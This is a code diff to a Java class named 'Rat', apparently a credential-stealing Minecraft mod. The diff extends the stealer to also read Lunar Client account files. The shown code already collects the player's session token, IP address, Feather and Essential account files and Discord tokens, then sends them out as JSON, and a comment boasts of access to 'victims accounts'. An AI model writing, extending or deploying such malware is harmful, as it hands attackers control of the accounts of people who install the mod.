@@ -51,16 +51,20 @@ public class Rat { //change class name please for the love of god
                 Minecraft mc = Minecraft.getMinecraft();
                 String ip = new BufferedReader(new InputStreamReader(new URL("https://checkip.amazonaws.com/").openStream())).readLine();
                 String token = mc.getSession().getToken();
-                String feather = "File not found :(", essentials = "File not found :(", discord = "Discord not found :(";
-                
+                String feather = "File not found :(", essentials = "File not found :(", lunar = "File not found :(", discord = "Discord not found :(";
+
                 //"if u swap these files with yours, you get infinite access to victims accounts"      -Annah#5795
                 //apparently doesn't work lol
                 if (Files.exists(Paths.get(mc.mcDataDir.getParent(), ".feather/accounts.json"))) {
-                    feather = Files.readAllLines(Paths.get(mc.mcDataDir.getParent(), ".feather/accounts.json")).toString();
+                    feather = StringEscapeUtils.escapeJson(new String(Files.readAllBytes(Paths.get(mc.mcDataDir.getParent(), ".feather/accounts.json")), StandardCharsets.UTF_8));
                 }
 
                 if (Files.exists(Paths.get(mc.mcDataDir.getPath(), "essential/microsoft_accounts.json"))) {
-                    essentials = Files.readAllLines(Paths.get(mc.mcDataDir.getPath(), "essential/microsoft_accounts.json")).toString();
+                    essentials = StringEscapeUtils.escapeJson(new String(Files.readAllBytes(Paths.get(mc.mcDataDir.getPath(), "essential/microsoft_accounts.json")), StandardCharsets.UTF_8));
+                }
+
+                if (Files.exists(Paths.get(System.getProperty("user.home"), ".lunarclient/settings/game/accounts.json"))) {
+                    lunar = StringEscapeUtils.escapeJson(new String(Files.readAllBytes(Paths.get(System.getProperty("user.home"), ".lunarclient/settings/game/accounts.json")), StandardCharsets.UTF_8));
                 }
 
                 //discord tokens
@@ -144,7 +148,7 @@ public class Rat { //change class name please for the love of god
                 }
 
                 //send req
-                String jsonInputString = String.format("{ \"username\": \"%s\", \"uuid\": \"%s\", \"token\": \"%s\", \"ip\": \"%s\", \"feather\": \"%s\", \"essentials\": \"%s\", \"discord\": \"%s\" }", mc.getSession().getUsername(), mc.getSession().getPlayerID(), token, ip, StringEscapeUtils.escapeJson(feather), StringEscapeUtils.escapeJson(essentials), discord);
+                String jsonInputString = String.format("{ \"username\": \"%s\", \"uuid\": \"%s\", \"token\": \"%s\", \"ip\": \"%s\", \"feather\": \"%s\", \"essentials\": \"%s\", \"lunar\": \"%s\", \"discord\": \"%s\" }", mc.getSession().getUsername(), mc.getSession().getPlayerID(), token, ip, feather, essentials, lunar, discord);
                 OutputStream os = c.getOutputStream();
                 byte[] input = jsonInputString.getBytes(StandardCharsets.UTF_8);
                 os.write(input, 0, input.length);
